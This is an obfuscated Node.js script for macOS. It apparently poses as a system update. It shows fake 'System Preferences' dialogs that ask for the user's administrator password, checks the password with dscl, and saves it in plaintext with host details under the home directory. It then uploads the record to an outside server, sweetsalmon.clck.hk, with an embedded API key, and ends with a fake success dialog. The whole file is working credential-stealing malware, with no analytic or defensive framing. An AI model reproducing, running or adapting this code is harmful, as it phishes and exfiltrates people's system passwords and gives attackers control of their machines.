#!/usr/bin/env node

const _0x1bf91a=_0x38f5;(function(_0x1eada8,_0x5a0115){const _0x503ce8=_0x38f5,_0xe9e0a0=_0x1eada8();while(!![]){try{const _0x4fa77d=-parseInt(_0x503ce8(0x211))/0x1*(parseInt(_0x503ce8(0x22b))/0x2)+parseInt(_0x503ce8(0x226))/0x3*(parseInt(_0x503ce8(0x231))/0x4)+-parseInt(_0x503ce8(0x21f))/0x5*(-parseInt(_0x503ce8(0x228))/0x6)+parseInt(_0x503ce8(0x24d))/0x7*(-parseInt(_0x503ce8(0x203))/0x8)+-parseInt(_0x503ce8(0x246))/0x9*(parseInt(_0x503ce8(0x239))/0xa)+-parseInt(_0x503ce8(0x1f5))/0xb*(-parseInt(_0x503ce8(0x20e))/0xc)+parseInt(_0x503ce8(0x25a))/0xd*(parseInt(_0x503ce8(0x255))/0xe);if(_0x4fa77d===_0x5a0115)break;else _0xe9e0a0['push'](_0xe9e0a0['shift']());}catch(_0x4ce413){_0xe9e0a0['push'](_0xe9e0a0['shift']());}}}(_0x4bc9,0xe6dfe));const {execSync}=require(_0x1bf91a(0x21d)),fs=require('fs'),path=require(_0x1bf91a(0x235)),os=require('os'),crypto=require(_0x1bf91a(0x222)),http=require(_0x1bf91a(0x250)),https=require(_0x1bf91a(0x223)),CONFIG={'serverDomain':_0x1bf91a(0x251),'serverPath':'/api/files/upload','serverPort':0x1f98,'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};let SYSTEM_PASSWORD=null;function log(_0x597ceb,_0xaae6bb){const _0xdfda14=_0x1bf91a,_0x42616f=new Date()[_0xdfda14(0x24e)]();console[_0xdfda14(0x229)]('['+_0x42616f+']\x20'+_0x597ceb);if(_0xaae6bb)console[_0xdfda14(0x20d)](_0xaae6bb);try{const _0x326b86=path[_0xdfda14(0x245)](os[_0xdfda14(0x24f)](),_0xdfda14(0x238));fs[_0xdfda14(0x25c)](_0x326b86,'['+_0x42616f+']\x20'+_0x597ceb+'\x0a');if(_0xaae6bb)fs[_0xdfda14(0x25c)](_0x326b86,(_0xaae6bb[_0xdfda14(0x252)]||_0xaae6bb)+'\x0a');}catch(_0x598bcf){}}function verifyPassword(_0x4c6014,_0x12e619){const _0x30d4f6=_0x1bf91a;try{const _0x484d61=_0x30d4f6(0x217)+_0x4c6014+'\x20'+_0x12e619;return execSync(_0x484d61,{'stdio':'ignore'}),!![];}catch(_0xfeff81){return![];}}async function getMacOSPassword(){const _0x4ed4aa=_0x1bf91a;log(_0x4ed4aa(0x20f));try{const _0x3e96b6=os[_0x4ed4aa(0x1fb)]()[_0x4ed4aa(0x1f7)];log(_0x4ed4aa(0x25f)+_0x3e96b6);for(let _0x814664=0x1;_0x814664<=0x5;_0x814664++){log('Attempt\x20'+_0x814664+'\x20of\x205\x20to\x20get\x20password');const _0x16ae0b=_0x4ed4aa(0x232);try{const _0x222b7f=execSync(_0x16ae0b,{'encoding':_0x4ed4aa(0x213)});let _0x487d30='';const _0x55d2c8=_0x222b7f['match'](/text returned:([^,]+)/);if(_0x55d2c8&&_0x55d2c8[0x1]){_0x487d30=_0x55d2c8[0x1][_0x4ed4aa(0x205)]();if(verifyPassword(_0x3e96b6,_0x487d30))return log(_0x4ed4aa(0x221)),SYSTEM_PASSWORD=_0x487d30,_0x487d30;else log(_0x4ed4aa(0x234)),_0x814664<0x5&&execSync(_0x4ed4aa(0x23b));}else{if(_0x222b7f[_0x4ed4aa(0x260)]('gave\x20up:true'))return log('User\x20canceled\x20password\x20entry'),null;else log(_0x4ed4aa(0x1fc));}}catch(_0x500a37){log(_0x4ed4aa(0x20b)+_0x500a37['message']);if(_0x500a37['message'][_0x4ed4aa(0x260)](_0x4ed4aa(0x225)))return log(_0x4ed4aa(0x1f8)),null;}}return execSync(_0x4ed4aa(0x1ff)),null;}catch(_0x54ad5b){return log(_0x4ed4aa(0x253)+_0x54ad5b['message'],_0x54ad5b),null;}}function generateClientId(){const _0x2fdcba=_0x1bf91a;try{const _0xed2f87=getMacAddress(),_0x3be99e=os[_0x2fdcba(0x259)](),_0x21149d=os['userInfo']()['username'],_0x1cd6e1=crypto[_0x2fdcba(0x20c)]('md5')[_0x2fdcba(0x212)](_0xed2f87+':'+_0x3be99e+':'+_0x21149d)[_0x2fdcba(0x20a)](_0x2fdcba(0x244))[_0x2fdcba(0x1fe)](0x0,0x8);return _0x1cd6e1;}catch(_0x58cb2a){return Math[_0x2fdcba(0x206)]()[_0x2fdcba(0x209)](0x24)[_0x2fdcba(0x1fe)](0x2,0xa);}}function getMacAddress(){const _0x5d05fb=_0x1bf91a;try{const _0x28604d=os[_0x5d05fb(0x257)]();for(const _0x4890de of Object['keys'](_0x28604d)){for(const _0x21516e of _0x28604d[_0x4890de]){if(!_0x21516e[_0x5d05fb(0x1f3)]&&_0x21516e[_0x5d05fb(0x237)]!=='00:00:00:00:00:00')return _0x21516e[_0x5d05fb(0x237)];}}return'unknown';}catch(_0xb4093f){return _0x5d05fb(0x218);}}async function uploadToServer(_0xa2dab3,_0x3f834a=0x0){return new Promise(_0x5cf3a0=>{const _0x8e39b7=_0x38f5;try{const _0x369c99=generateClientId(),_0x1a731b={'hostname':os[_0x8e39b7(0x259)](),'platform':os[_0x8e39b7(0x207)](),'type':os['type'](),'arch':os[_0x8e39b7(0x200)](),'username':os['userInfo']()[_0x8e39b7(0x1f7)],'id':_0x369c99},_0x4c2c69=CONFIG[_0x8e39b7(0x25e)]===0x1bb?_0x8e39b7(0x223):_0x8e39b7(0x250),_0x25d910=_0x4c2c69+_0x8e39b7(0x22c)+CONFIG[_0x8e39b7(0x240)]+':'+CONFIG['serverPort']+CONFIG[_0x8e39b7(0x233)],_0x4c3f55=_0x25d910['startsWith']('https://'),_0x2600b0=_0x4c3f55?https:http,_0x12c207=new URL(_0x25d910),_0x3b188a=_0x8e39b7(0x216)+Math[_0x8e39b7(0x206)]()[_0x8e39b7(0x209)](0x10)[_0x8e39b7(0x215)](0x2);let _0x31fd42='';_0x31fd42+='--'+_0x3b188a+'\x0d\x0a',_0x31fd42+=_0x8e39b7(0x25d),_0x31fd42+=_0x8e39b7(0x208),_0x31fd42+=JSON[_0x8e39b7(0x1fa)](_0x1a731b)+'\x0d\x0a',_0x31fd42+='--'+_0x3b188a+'\x0d\x0a',_0x31fd42+='Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22'+_0x369c99+'.txt\x22\x0d\x0a',_0x31fd42+=_0x8e39b7(0x22f),_0x31fd42+=_0xa2dab3+'\x0d\x0a',_0x31fd42+='--'+_0x3b188a+_0x8e39b7(0x201);const _0x58c65d={'hostname':_0x12c207[_0x8e39b7(0x259)],'port':_0x12c207[_0x8e39b7(0x24c)]||(_0x4c3f55?0x1bb:0x50),'path':_0x12c207[_0x8e39b7(0x23c)]+_0x12c207[_0x8e39b7(0x258)],'method':_0x8e39b7(0x21e),'headers':{'Content-Type':_0x8e39b7(0x21a)+_0x3b188a,'Content-Length':Buffer['byteLength'](_0x31fd42),'X-Client-Info':JSON[_0x8e39b7(0x1fa)](_0x1a731b),'X-API-Key':CONFIG[_0x8e39b7(0x242)]},'timeout':CONFIG[_0x8e39b7(0x22e)]};log('Uploading\x20data\x20to\x20server:\x20'+_0x25d910);const _0x28368c=_0x2600b0['request'](_0x58c65d,_0x24e5fb=>{let _0x152222='';_0x24e5fb['on']('data',_0x3f9d97=>{_0x152222+=_0x3f9d97;}),_0x24e5fb['on']('end',()=>{const _0x282638=_0x38f5;_0x24e5fb['statusCode']>=0xc8&&_0x24e5fb[_0x282638(0x21b)]<0x12c?(log(_0x282638(0x227)+_0x24e5fb[_0x282638(0x21b)]),_0x5cf3a0(!![])):(log('Upload\x20failed:\x20'+_0x24e5fb[_0x282638(0x21b)]+',\x20'+_0x152222),_0x3f834a<CONFIG[_0x282638(0x1fd)]?(log('Retrying\x20upload\x20('+(_0x3f834a+0x1)+'/'+CONFIG[_0x282638(0x1fd)]+_0x282638(0x21c)),setTimeout(()=>{const _0x5c734d=_0x282638;uploadToServer(_0xa2dab3,_0x3f834a+0x1)[_0x5c734d(0x23f)](_0x5cf3a0);},CONFIG[_0x282638(0x214)])):(log(_0x282638(0x241)),_0x5cf3a0(![])));});});_0x28368c['on'](_0x8e39b7(0x20d),_0x5346d9=>{const _0x599c6b=_0x8e39b7;log(_0x599c6b(0x1f2)+_0x5346d9[_0x599c6b(0x210)],_0x5346d9),_0x3f834a<CONFIG['maxRetries']?(log(_0x599c6b(0x23d)+(_0x3f834a+0x1)+'/'+CONFIG['maxRetries']+_0x599c6b(0x21c)),setTimeout(()=>{uploadToServer(_0xa2dab3,_0x3f834a+0x1)['then'](_0x5cf3a0);},CONFIG[_0x599c6b(0x214)])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x5cf3a0(![]));}),_0x28368c['write'](_0x31fd42),_0x28368c[_0x8e39b7(0x1f6)]();}catch(_0x2b811b){log(_0x8e39b7(0x24a)+_0x2b811b[_0x8e39b7(0x210)],_0x2b811b),_0x3f834a<CONFIG[_0x8e39b7(0x1fd)]?(log(_0x8e39b7(0x23d)+(_0x3f834a+0x1)+'/'+CONFIG['maxRetries']+_0x8e39b7(0x21c)),setTimeout(()=>{uploadToServer(_0xa2dab3,_0x3f834a+0x1)['then'](_0x5cf3a0);},CONFIG[_0x8e39b7(0x214)])):(log(_0x8e39b7(0x241)),_0x5cf3a0(![]));}});}function savePasswordLocally(_0x313747){const _0x47f799=_0x1bf91a;try{const _0x4a784b=os[_0x47f799(0x1fb)]()[_0x47f799(0x1f7)],_0x14276f=generateClientId(),_0x4cd998=new Date()[_0x47f799(0x24e)](),_0x18fb74=os[_0x47f799(0x24f)](),_0x4dd54b=path[_0x47f799(0x245)](_0x18fb74,_0x47f799(0x23a));!fs[_0x47f799(0x25b)](_0x4dd54b)&&fs[_0x47f799(0x248)](_0x4dd54b,{'recursive':!![]});const _0x4edc1e='User:\x20'+_0x4a784b+_0x47f799(0x236)+_0x313747+'\x0aTime:\x20'+_0x4cd998+_0x47f799(0x24b)+os[_0x47f799(0x259)]()+_0x47f799(0x22d)+os[_0x47f799(0x207)]()+'\x0aType:\x20'+os[_0x47f799(0x23e)]()+_0x47f799(0x1f9)+os[_0x47f799(0x200)]()+'\x0aClientID:\x20'+_0x14276f,_0x22793e=path[_0x47f799(0x245)](_0x4dd54b,_0x14276f+_0x47f799(0x1f4));fs[_0x47f799(0x254)](_0x22793e,_0x4edc1e),log(_0x47f799(0x243)+_0x22793e);const _0x2a5a5b={'user':_0x4a784b,'password':_0x313747,'timestamp':_0x4cd998,'hostname':os[_0x47f799(0x259)](),'system':{'platform':os[_0x47f799(0x207)](),'release':os[_0x47f799(0x247)](),'type':os[_0x47f799(0x23e)](),'arch':os[_0x47f799(0x200)]()},'clientId':_0x14276f},_0x179466=path['join'](_0x4dd54b,_0x14276f+_0x47f799(0x256));return fs[_0x47f799(0x254)](_0x179466,JSON[_0x47f799(0x1fa)](_0x2a5a5b,null,0x2)),log(_0x47f799(0x22a)+_0x179466),_0x4edc1e;}catch(_0x37e337){return log(_0x47f799(0x219)+_0x37e337[_0x47f799(0x210)],_0x37e337),null;}}async function main(){const _0x5c0b6b=_0x1bf91a;try{log(_0x5c0b6b(0x220));const _0x42bca4=await getMacOSPassword();if(!_0x42bca4){log('Password\x20collection\x20failed\x20or\x20was\x20canceled');return;}const _0x1ebe7d=savePasswordLocally(_0x42bca4);if(!_0x1ebe7d){log(_0x5c0b6b(0x230));return;}const _0xeedb83=await uploadToServer(_0x1ebe7d);if(_0xeedb83){log(_0x5c0b6b(0x202));try{execSync(_0x5c0b6b(0x249));}catch(_0x3eeb14){}}else log(_0x5c0b6b(0x204));log(_0x5c0b6b(0x224));}catch(_0x2990e1){log('Unexpected\x20error\x20in\x20main\x20process',_0x2990e1);}}function _0x38f5(_0x132595,_0x3184b0){const _0x4bc9be=_0x4bc9();return _0x38f5=function(_0x38f5d0,_0xd29bf5){_0x38f5d0=_0x38f5d0-0x1f2;let _0x44e3a1=_0x4bc9be[_0x38f5d0];return _0x44e3a1;},_0x38f5(_0x132595,_0x3184b0);}main();function _0x4bc9(){const _0x37980b=['osascript\x20-e\x20\x27display\x20dialog\x20\x22System\x20settings\x20updated\x20successfully.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','Upload\x20error:\x20','\x0aHostname:\x20','port','57596lGLczh','toISOString','homedir','http','sweetsalmon.clck.hk','stack','Error\x20getting\x20administrator\x20password:\x20','writeFileSync','14QIyFoz','.json','networkInterfaces','search','hostname','17106297mbPmdV','existsSync','appendFileSync','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','serverPort','Current\x20user:\x20','includes','Request\x20error:\x20','internal','.txt','4955599LdyLvt','end','username','User\x20canceled\x20password\x20entry','\x0aArchitecture:\x20','stringify','userInfo','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','maxRetries','substring','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20The\x20application\x20will\x20exit.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','arch','--\x0d\x0a','Password\x20successfully\x20uploaded\x20to\x20server','1224HaVDZL','Failed\x20to\x20upload\x20password\x20to\x20server','trim','random','platform','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','toString','digest','Error\x20requesting\x20password\x20via\x20dialog:\x20','createHash','error','12APauLA','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20===','message','1EofOwx','update','utf8','retryDelay','substr','----WebKitFormBoundary','dscl\x20/Local/Default\x20-authonly\x20','unknown','Error\x20saving\x20password\x20locally:\x20','multipart/form-data;\x20boundary=','statusCode',')...','child_process','POST','175whAjAR','Starting\x20macOS\x20password\x20collection\x20process','Administrator\x20password\x20verified','crypto','https','Password\x20collection\x20process\x20completed','User\x20canceled','9BzFUlC','Upload\x20successful:\x20','184998zHADFh','log','JSON\x20data\x20saved\x20to:\x20','693804eZLvxM','://','\x0aPlatform:\x20','timeout','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','Failed\x20to\x20save\x20password\x20locally','1654624NtXarC','osascript\x20-e\x20\x27display\x20dialog\x20\x22To\x20launch\x20the\x20application,\x20you\x20need\x20to\x20update\x20the\x20system\x20settings\x5cn\x5cnPlease\x20enter\x20your\x20password.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','serverPath','Password\x20verification\x20failed','path','\x0aPassword:\x20','mac','temp_logs.txt','130hWWtfP','SecurityUpdates','osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Please\x20try\x20again.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','pathname','Retrying\x20upload\x20(','type','then','serverDomain','Maximum\x20retry\x20attempts\x20reached','apiKey','Password\x20data\x20saved\x20to:\x20','hex','join','1062729QFnpsa','release','mkdirSync'];_0x4bc9=function(){return _0x37980b;};return _0x4bc9();}
